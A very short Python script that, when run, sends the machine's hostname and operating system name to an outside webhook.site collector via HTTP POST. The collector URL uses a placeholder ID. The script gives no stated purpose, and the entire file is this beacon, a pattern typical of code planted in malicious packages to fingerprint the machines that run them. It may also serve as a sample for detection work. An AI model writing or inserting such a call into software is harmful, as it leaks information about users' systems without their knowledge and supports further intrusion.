import platform
import socket
import requests


requests.post(
    "https://webhook.site/12345678-1234-1234-1234-123456789abc",
    json={"hostname": socket.gethostname(), "platform": platform.system()},
)
